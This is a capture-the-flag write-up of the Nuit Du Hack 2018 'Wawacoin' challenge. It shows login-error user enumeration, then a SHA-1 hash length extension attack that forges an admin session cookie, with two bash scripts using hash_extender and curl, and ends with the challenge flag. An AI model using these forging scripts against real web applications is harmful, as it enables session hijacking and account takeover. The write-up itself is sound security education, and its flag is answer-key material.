# Wawacoin

Wawacoin was a 400-point Crypto/Web challenge at **Nuit Du Hack Quals 2018**. As is [not the first time](https://inshallhack.org/pizzagate_34C3/), we ended up flagging this challenge about **10 minutes after the end of the CTF**. Nevertheless, here it goes!

## Challenge description

## Recon

The menu shows links to 3 different pages: **/**, **/login** and **/register**.

Let's check them all out!

### Page: /

**/** contains static content, with a graph and some text; it's unlikely to be very interesting for us. The source of the page contains links to two potentially interesting JavaScript files: **/static/js/wawacoin.js** and **/js/wawacoin-miner.js**. Unfortunately, the first is empty and the second doesn't exist.

### Page: /login

**/login** contains a login form to something called **WawaManager**. We throw some (*unsuccessful*) **random SQLi attempts** at it and try to login with different credentials, such as **admin:admin** or **root:toor**.
In the process, we notice that we get two different errors: `Bad username` and  `Bad password`. From that, we deduce that the form is vulnerable to **user enumeration** and subsequently, that a user with the login "**admin**" exists. Let's keep that in mind for later.

### Page: /register

**/register** informs us that it is no longer possible to register on the website, but invites us to try out the website using a "demo" account by clicking on a link to **/login?demo=1**.

### Page: /login?demo=1 -> /manager

**/login?demo=1** redirects us to **/manager**, which contains a seemingly totally legit form that invites us to provide our bank card information in order to verify our identity before entering the demo interface. Doubt regarding the legitimacy turn to dust as we fill out the required information, only for them to be **partially** sent (*half the information was missing*) as a **POST request** to **/stealmoney**, resulting in the page advising us that we "**need at least 1M bucks for this to work**". Our last shreds of hope turn to dust as we get the exact same response when trying the same process with our multimillionaire bank account.

A session cookie was set when accessing the page: **session=757365723d64656d6f|9183ff6055a46981f2f71cd36430ed3d9cbf6861**.
After logging out of the demo account and in again, we observe that the cookie still contains the same value.

Digging a bit deeper, we observe that it is made of two distinct parts (*separated by a "|"*): the first is the hex value of the string **user=demo**, while the second seems to be a hash of some kind. Since it is 40 digits long, **we assume it is a SHA-1 hash**. However, the hash is not equal to **sha1("user=demo")**; modifying any part of the cookie seems to render it unusable, which leads us to believe that the hash is some kind of **MAC** for the first part of the cookie, and uses a secret key owned by the server.


## Exploitation

Though it took us quite a while to figure it out, a **hash length extension attack** is the only (*and obvious*) way to go here. We may assume that our aim is to get a hold of another, non-demo user account on the website, which means that knowing **admin** is a valid user will come in handy.

### Hash length extension attack

The whole explanation between [hash length extension attacks](vhttps://en.wikipedia.org/wiki/Length_extension_attack) is beyond the scope of this writeup. The idea behind it, though, is that assuming some characteristics of the hashing algorithm (*which SHA-1 and MD5 have*), and **knowing the length of the secret key used, a string and its MAC**, it is possible to extend said string and to **produce a valid MAC for the extended string**.

For a clearer explanation, see [skullsecurity.org](https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks) or [batard.info](https://journal.batard.info/post/2011/03/04/exploiting-sha-1-signed-messages).

With the end of the CTF approaching really fast, we stumble upon [hash-extender](https://github.com/iagox86/hash_extender) and get to work.

### Flag time

While we have a string and its MAC, **we still need to find out the length of the secret key** in order to launch our hash length extension attack.

To that end, we quickly craft the following dirty script:

```bash
#!/bin/bash

append=$1

for i in $(seq 1 20)
do
    echo $i
    tmp=$(./hash_extender -d="user=demo" --signature=9183ff6055a46981f2f71cd36430ed3d9cbf6861 --format=sha1 --append "$append" -l $i | grep -v Type | grep -v Secret | cut -d":" -f 2 | tr "\n" "|" | tr -d " " | sed 's/||//g')
    tmp2=$(echo $tmp | cut -d"|" -f 2)
    tmp3=$(echo $tmp | cut -d"|" -f 1)
    cookie=$(echo "$tmp2|$tmp3")
    curl 'http://wawacoin.challs.malice.fr/manager' -H "Cookie: session=$cookie"
done
```

Then, **we use the response code of the curl request as an oracle**: if the response code is 200, that means that the cookie is valid (*and that we found the right length for the secret key*); otherwise, we get redirected out of the manager and the status code is thus 302. The value of `$append` doesn't matter at this point.

After running the above script, we figure out that the secret key is **16 characters long**.
All that's left is to find a proper payload now.

With our little CTF experience, we quickly try out the value **user=demo;user=admin** and obtain the flag (*albeit too late :(*):

```bash
#!/bin/bash

append=";user=admin"
i=16
tmp=$(./hash_extender -d="user=demo" --signature=9183ff6055a46981f2f71cd36430ed3d9cbf6861 --format=sha1 --append "$append" -l $i | grep -v Type | grep -v Secret | cut -d":" -f 2 | tr "\n" "|" | tr -d " " | sed 's/||//g')
tmp2=$(echo $tmp | cut -d"|" -f 2)
tmp3=$(echo $tmp | cut -d"|" -f 1)
cookie=$(echo "$tmp2|$tmp3")
curl 'http://wawacoin.challs.malice.fr/manager' -H "Cookie: session=$cookie"
```

Andâ€¦ **Flagged!**

**Flag: NDH{c7774051db4b880da67598770c955ff99363e76d}**
